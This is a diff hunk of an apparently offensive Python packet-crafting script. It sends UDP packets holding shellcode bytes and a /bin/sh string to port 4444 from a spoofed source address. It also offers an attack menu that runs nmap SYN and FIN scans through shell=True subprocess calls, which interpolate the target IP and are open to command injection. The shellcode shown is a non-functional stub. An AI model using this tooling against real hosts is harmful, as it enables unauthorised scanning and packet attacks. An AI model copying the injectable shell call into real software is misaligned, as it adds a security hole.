@@ -35,17 +35,17 @@ while True:
         send(ip_layer / udp_layer / Raw(udp_data))
         print("packet sent")
     def shell_code():
-        ip_layer = IP(src='10.0.0.1', dst='10.0.0.2')
+        ip_layer = IP(src=obf, dst=ip)
         udp_data = binascii.unhexlify('909090E8C0FFFFFF2f62696e2f7368') # Shellcode and /bin/sh string
         length = len(udp_data)
         udp_layer = UDP(dport=4444, sport=22344, len=length)
         send(ip_layer / udp_layer / Raw(udp_data))
         print("Packet Sent")
 
-        if attack == 1:
-        print("SYN Scan")
-        subprocess.call(f"nmap -p 22 -sS {ip}", shell=True)
-        subprocess.call(["ls", "-l"])
+    if attack == 1:
+            print("SYN Scan")
+            subprocess.call(f"nmap -p 22 -sS {ip}", shell=True)
+            subprocess.call(["ls", "-l"])
     elif attack == 2:
         print("Fin Scan")
         subprocess.call(f"nmap -sF -p 80 {ip}", shell=True)
